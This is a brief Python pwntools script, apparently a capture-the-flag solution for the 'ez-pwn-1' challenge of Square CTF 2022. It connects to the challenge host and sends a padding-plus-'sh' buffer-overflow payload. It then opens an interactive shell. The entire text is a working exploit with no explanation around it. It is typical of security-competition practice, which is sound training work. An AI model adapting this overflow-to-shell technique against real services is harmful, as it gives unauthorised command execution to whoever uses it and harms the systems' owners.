from pwn import*

p = remote("chals.2022.squarectf.com", 4100)
#p = process("./ez-pwn-1")

payload = b"a"*8 + b"sh"

p.sendline(payload)
p.interactive()
